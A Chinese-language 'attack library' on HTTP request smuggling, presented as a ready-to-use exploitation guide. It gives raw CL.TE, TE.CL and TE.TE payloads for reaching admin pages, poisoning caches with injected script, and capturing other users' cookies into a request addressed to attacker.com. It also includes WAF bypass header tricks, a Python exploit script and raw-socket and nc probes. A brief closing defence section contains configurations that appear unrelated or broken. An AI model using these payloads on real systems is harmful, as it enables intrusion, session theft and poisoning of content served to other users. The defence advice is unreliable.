# HTTP请求走私 攻击库

## 漏洞概述

HTTP请求走私(HTTP Request Smuggling)是一种利用前端服务器和后端服务器对HTTP请求边界判断不一致的攻击技术。当请求经过多个HTTP服务器(如负载均衡器、代理、CDN)时,不同服务器对请求边界的理解可能存在差异,攻击者可以利用这种差异走私恶意请求。

**攻击价值**: 
- 绕过安全控制和访问限制
- 缓存投毒影响其他用户
- 会话劫持获取敏感信息
- Web缓存欺骗
- 绕过前端安全检查

## 核心技术原理

### 1. CL.TE 请求走私

**场景**: 前端服务器使用Content-Length,后端服务器使用Transfer-Encoding

**攻击原理**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

前端服务器读取Content-Length(13字节),认为请求体结束于"0\r\n\r\n"
后端服务器使用Transfer-Encoding,将"SMUGGLED"视为下一个请求的开始

**利用示例**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### 2. TE.CL 请求走私

**场景**: 前端服务器使用Transfer-Encoding,后端服务器使用Content-Length

**攻击原理**:
```http
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0


```

前端服务器按Transfer-Encoding处理,认为请求在"0\r\n\r\n"结束
后端服务器按Content-Length(3)处理,只读取"8\r\n",将剩余内容作为下一个请求

### 3. TE.TE 请求走私

**场景**: 前端和后端都支持Transfer-Encoding,但可以通过混淆使其中一个不处理

**混淆技术**:
```http
Transfer-Encoding: chunked
Transfer-Encoding: chunked
Transfer-Encoding: chunked

Transfer-encoding: chunked
Transfer-Encoding: identity
Transfer-Encoding: x

Transfer-Encoding:[tab]chunked
```

## 实战利用场景

### 场景1: 绕过前端访问控制

**目标**: 访问被前端保护的管理页面

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 143
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=
```

**工作流程**:
1. 前端服务器看到Content-Length=143,转发整个请求
2. 后端服务器使用Transfer-Encoding,在"0\r\n\r\n"后认为请求结束
3. "GET /admin"被拼接到下一个正常用户的请求前
4. 下一个用户的请求变成访问/admin,可能携带有效session

### 场景2: 缓存投毒攻击

**目标**: 向缓存注入恶意内容影响其他用户

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 200
Transfer-Encoding: chunked

0

GET /static/page.js HTTP/1.1
Host: target.com
Content-Length: 100

HTTP/1.1 200 OK
Content-Type: text/javascript

alert('XSS')
```

**效果**: 缓存会存储被污染的JavaScript文件,所有访问该文件的用户都会受到XSS攻击

### 场景3: 会话劫持

**目标**: 窃取其他用户的敏感请求内容

```http
POST / HTTP/1.1
Host: target.com
Content-Length: 250
Transfer-Encoding: chunked

0

POST /logger HTTP/1.1
Host: attacker.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 500

data=
```

**效果**: 下一个用户的完整请求(包括Cookie、POST数据)会被附加到data=后面,发送到攻击者控制的服务器

### 场景4: Web缓存欺骗

**目标**: 使用户自己的敏感数据被缓存到公共资源路径

```http
GET / HTTP/1.1
Host: target.com
Content-Length: 75
Transfer-Encoding: chunked

0

GET /profile/update HTTP/1.1
Host: target.com


GET /static/logo.png HTTP/1.1
Host: target.com
```

## 通用检测技术

### 1. 时间延迟检测

**CL.TE检测payload**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X
```

如果后端使用TE,会等待下一个chunk,造成延迟

**TE.CL检测payload**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 6
Transfer-Encoding: chunked

0

X
```

如果后端使用CL,会等待更多数据,造成延迟

### 2. 差异化响应检测

发送特殊构造的请求,观察响应的变化:

```http
POST /search HTTP/1.1
Host: target.com
Content-Length: 100
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Host: target.com
Content-Length: 10

x=
```

如果下一个请求收到404响应,说明走私成功

## 自动化检测脚本

### Python检测脚本

```python
#!/usr/bin/env python3
"""
HTTP请求走私漏洞检测脚本
"""
import requests
import time

def test_cl_te(url):
    """测试CL.TE走私"""
    print("[*] 测试 CL.TE 请求走私...")
    
    headers = {
        'Content-Length': '4',
        'Transfer-Encoding': 'chunked'
    }
    
    # Payload会导致后端服务器等待
    payload = "1\r\nA\r\nX"
    
    start = time.time()
    try:
        r = requests.post(url, headers=headers, data=payload, timeout=15)
        elapsed = time.time() - start
        
        if elapsed > 10:
            print(f"[+] 可能存在CL.TE漏洞 (延迟: {elapsed}秒)")
            return True
    except requests.Timeout:
        print("[+] 请求超时,可能存在CL.TE漏洞")
        return True
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    return False

def test_te_cl(url):
    """测试TE.CL走私"""
    print("[*] 测试 TE.CL 请求走私...")
    
    headers = {
        'Content-Length': '6',
        'Transfer-Encoding': 'chunked'
    }
    
    payload = "0\r\n\r\nX"
    
    start = time.time()
    try:
        r = requests.post(url, headers=headers, data=payload, timeout=15)
        elapsed = time.time() - start
        
        if elapsed > 10:
            print(f"[+] 可能存在TE.CL漏洞 (延迟: {elapsed}秒)")
            return True
    except requests.Timeout:
        print("[+] 请求超时,可能存在TE.CL漏洞")
        return True
    except Exception as e:
        print(f"[-] 错误: {e}")
    
    return False

def exploit_smuggle(url, smuggled_request):
    """实际利用走私发送恶意请求"""
    print("[*] 执行请求走私攻击...")
    
    # CL.TE利用示例
    smuggled = smuggled_request.replace('\n', '\r\n')
    content_length = len(smuggled.split('\r\n\r\n')[0]) + 4
    
    headers = {
        'Content-Length': str(content_length),
        'Transfer-Encoding': 'chunked'
    }
    
    payload = f"0\r\n\r\n{smuggled}"
    
    try:
        r = requests.post(url, headers=headers, data=payload)
        print(f"[+] 走私请求已发送")
        print(f"[*] 响应状态: {r.status_code}")
        return r
    except Exception as e:
        print(f"[-] 错误: {e}")
        return None

# 使用示例
if __name__ == "__main__":
    target = "http://target.com/"
    
    # 检测漏洞
    test_cl_te(target)
    test_te_cl(target)
    
    # 利用示例:访问管理页面
    smuggled = """GET /admin HTTP/1.1
Host: target.com
Content-Length: 10

x="""
    
    exploit_smuggle(target, smuggled)
```

## Burp Suite检测方法

### 1. 使用Turbo Intruder

```python
# turbo_smuggle.py
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=1,
                          requestsPerConnection=100,
                          pipeline=False)
    
    # CL.TE测试
    attack = '''POST / HTTP/1.1
Host: target.com
Content-Length: 4
Transfer-Encoding: chunked

1
A
X'''
    
    engine.queue(attack)

def handleResponse(req, interesting):
    table.add(req)
```

### 2. 使用HTTP Request Smuggler扩展

1. 安装"HTTP Request Smuggler"扩展
2. 在Proxy或Repeater中选择请求
3. 右键 → Extensions → HTTP Request Smuggler → Smuggle probe
4. 观察结果判断是否存在漏洞

## 手动测试流程

### Step 1: 识别请求处理链

```bash
# 查看响应头识别中间件
curl -I http://target.com

# 常见标识:
# Server: nginx/1.18.0
# X-Cache: HIT from proxy.com
# Via: 1.1 varnish
```

### Step 2: 发送探测请求

```bash
# CL.TE探测
printf 'POST / HTTP/1.1\r\n'\
'Host: target.com\r\n'\
'Content-Length: 4\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'1\r\n'\
'A\r\n'\
'X' | nc target.com 80
```

### Step 3: 确认走私

```bash
# 发送走私请求
printf 'POST / HTTP/1.1\r\n'\
'Host: target.com\r\n'\
'Content-Length: 6\r\n'\
'Transfer-Encoding: chunked\r\n'\
'\r\n'\
'0\r\n'\
'\r\n'\
'G' | nc target.com 80

# 立即发送正常请求观察响应
curl http://target.com/
```

## 防御绕过技术

### 1. 绕过WAF检测

**双重Content-Length**:
```http
POST / HTTP/1.1
Host: target.com
Content-Length: 50
Content-Length: 6
Transfer-Encoding: chunked

0

SMUGGLED
```

**混淆Transfer-Encoding**:
```http
POST / HTTP/1.1
Host: target.com
Transfer-Encoding: chunked
Transfer-Encoding: identity

5
hello
0


```

### 2. 绕过规范化

**使用非标准分隔符**:
```http
Transfer-Encoding: chunked
Transfer-Encoding:[space][tab]chunked
Transfer-Encoding:[vertical-tab]chunked
```

**畸形请求头**:
```http
Transfer-encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked, identity
```

## 实战工具集合

### 1. smuggler.py
```bash
# https://github.com/defparam/smuggler
python3 smuggler.py -u http://target.com
```

### 2. h2csmuggler
```bash
# HTTP/2走私检测
python3 h2csmuggler.py -x http://target.com
```

### 3. 自定义脚本模板

```python
import socket

def send_smuggle(host, port, payload):
    """发送原始HTTP请求"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))
    s.send(payload.encode())
    response = s.recv(4096)
    s.close()
    return response.decode()

# CL.TE Payload模板
cl_te_template = """POST / HTTP/1.1\r
Host: {host}\r
Content-Length: {cl}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
{smuggled}\r
\r
"""

smuggled_req = "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n"
payload = cl_te_template.format(
    host="target.com",
    cl=len(smuggled_req) + 4,
    smuggled=smuggled_req
)

response = send_smuggle("target.com", 80, payload)
print(response)
```

## 防御措施

### 1. 服务器配置

**禁用不必要的请求方法**:
```nginx
# Nginx配置
limit_except GET POST {
    deny all;
}
```

**标准化请求处理**:
```apache
# Apache配置
# 拒绝包含多个Content-Length的请求
Header unset Content-Length
RequestHeader unset Content-Length
```

### 2. 使用HTTP/2

HTTP/2使用二进制分帧,不存在请求边界歧义问题,建议升级协议

### 3. 前后端同步配置

确保所有服务器使用相同的请求边界判定方式:
- 统一使用Content-Length
- 统一使用Transfer-Encoding
- 拒绝包含两者的请求

### 4. WAF规则

```
# ModSecurity规则示例
SecRule REQUEST_HEADERS:Content-Length "@rx ^\d+$" \
    "id:100001,\
    phase:1,\
    deny,\
    status:400,\
    msg:'Multiple Content-Length headers'"

SecRule REQUEST_HEADERS:Transfer-Encoding "!@rx ^chunked$" \
    "id:100002,\
    phase:1,\
    deny,\
    status:400,\
    msg:'Invalid Transfer-Encoding'"
```

## 参考资源

- PortSwigger HTTP Request Smuggling教程
- Black Hat USA 2020: HTTP Request Smuggling演讲
- RFC 7230 - HTTP/1.1消息语法和路由
- OWASP Testing Guide: Testing for HTTP Request Smuggling

---

**最后更新**: 2025-11-16
**适用场景**: 多层HTTP架构、反向代理、CDN、负载均衡器环境
**攻击难度**: 中等到高级
**检测难度**: 需要仔细观察时间延迟和响应差异
